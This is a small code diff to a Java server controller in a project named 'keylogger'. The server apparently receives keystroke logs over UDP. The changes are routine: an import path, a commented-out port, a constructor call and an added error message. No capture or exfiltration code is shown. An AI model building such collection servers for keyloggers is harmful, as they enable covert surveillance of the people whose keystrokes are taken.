@@ -4,14 +4,14 @@ import java.text.SimpleDateFormat;
 import java.util.Date;
 
 import com.hao.keylogger.models.Log;
-import com.hao.keylogger.models.Resources;
+import com.hao.keylogger.utils.Resources;
 import com.hao.keylogger.views.ServerView;
 
 public class ServerLogController {
 	ServerView view;
 	Log log;
 	UDPServerHelper udpServerHelper;
-	private final int DEFAULT_PORT = 17;
+	//private final int DEFAULT_PORT = 4567;
 
 	private boolean isStarted = false;
 
@@ -30,7 +30,7 @@ public class ServerLogController {
 			int port = view.getPort();
 
 			// init
-			udpServerHelper = UDPServerHelper.getInstance(hostName, port);
+			udpServerHelper = new UDPServerHelper(hostName, port);
 			udpServerHelper.setController(this);
 
 			// start server and serve clients
@@ -38,6 +38,9 @@ public class ServerLogController {
 				appendToMonitory("Server started at " + hostName + ":" + port);
 				isStarted = true;
 				view.updateViewWhenServerIsStarted();
+			}
+			else {
+				view.appendToMonitor("Can not start server! The server may be running.\n");
 			}
 		}
 		else {
